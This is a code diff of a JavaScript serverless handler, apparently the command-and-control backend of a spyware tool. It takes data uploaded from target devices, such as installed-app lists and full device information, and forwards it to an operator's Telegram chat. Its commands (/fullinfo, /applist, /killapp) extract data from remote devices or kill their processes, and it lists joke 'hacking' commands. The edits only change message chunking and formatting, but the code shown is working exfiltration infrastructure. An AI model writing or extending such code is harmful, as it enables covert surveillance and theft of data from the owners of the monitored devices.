@@ -43,20 +43,19 @@ export default async function handler(req, res) {
 
   const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
     if (TELEGRAM_TOKEN && chatId) {
-      const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
-      if (keyboard) payload.reply_markup = keyboard;
-      
-      // تقسيم الرسائل الطويلة (بحال قائمة التطبيقات)
       const maxLength = 4000;
+      // إذا كان النص طويل (بحال التطبيقات)، كنقسمو لعدة رسائل
       if (text.length > maxLength) {
         for (let i = 0; i < text.length; i += maxLength) {
            const chunk = text.substring(i, i + maxLength);
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
              method: 'POST', headers: { 'Content-Type': 'application/json' }, 
-             body: JSON.stringify({ chat_id: chatId, text: chunk, parse_mode: 'Markdown' })
+             body: JSON.stringify({ chat_id: chatId, text: chunk }) // حيدنا Markdown باش ما يطيحش
            }).catch(() => {});
         }
       } else {
+        const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
+        if (keyboard) payload.reply_markup = keyboard;
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
           method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
         }).catch(() => {});
@@ -123,7 +122,18 @@ export default async function handler(req, res) {
             }
           }
           if (type === 'applist') {
-             await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`);
+             // كنصيفطو اللائحة بلا Markdown باش ما يطيحش بسبب الرموز
+             const msg = `📱 *التطبيقات المثبتة:*\n\n${cleanBody}`;
+             if (msg.length > 4000) {
+                for (let i = 0; i < msg.length; i += 4000) {
+                   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                     method: 'POST', headers: { 'Content-Type': 'application/json' }, 
+                     body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg.substring(i, i + 4000) })
+                   }).catch(() => {});
+                }
+             } else {
+                await sendToTelegram(msg);
+             }
           }
           res.status(200).send('"success"');
           resolve();
@@ -167,7 +177,6 @@ export default async function handler(req, res) {
             `/hacknasa /hackfb /spywa /ddos /matrix /darkweb /crypto /bypass /root /ssh /ignite /shadow`); 
           break;
         
-        // ===== أوامر حقيقية =====
         case '/fullinfo': remoteCommand = "fullinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*"); break;
         case '/applist': remoteCommand = "applist:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*"); break;
         case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 `[SYS]` *Terminating process...*"); break;
@@ -188,7 +197,6 @@ export default async function handler(req, res) {
         case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
         case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
 
-        // ===== الأوامر الفنية (التخمينية) =====
         default:
           const isDummy = dummyCommands.some(cmd => command === `/${cmd}`);
           if (isDummy || command.startsWith('/')) {
